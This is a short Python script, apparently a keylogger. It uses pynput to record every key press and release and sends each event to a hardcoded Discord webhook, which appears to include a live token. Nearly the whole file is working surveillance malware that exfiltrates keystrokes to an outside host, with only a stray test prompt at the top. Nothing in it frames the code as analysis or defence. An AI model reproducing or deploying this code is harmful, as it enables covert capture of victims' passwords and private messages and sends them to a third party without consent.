from pynput import keyboard
from dhooks import Webhook


# Discord Webhook
log_send = Webhook('https://discord.com/api/webhooks/1153571420689928192/dsIjIP-uAXVdFvB82jBmWg5diV7_1WPHZpZc8Aqny9P9wGXKa6ISYTZAnguY3GjAEOFR')

test = input('test')
log_send.send('test')



def on_press(key):
    try:
        log_send.send('```alphanumeric key {0} pressed```'.format(
            key.char))
    except AttributeError:
        log_send.send('```special key {0} pressed```'.format(
            key))

def on_release(key):
    log_send.send('```{0} released```'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()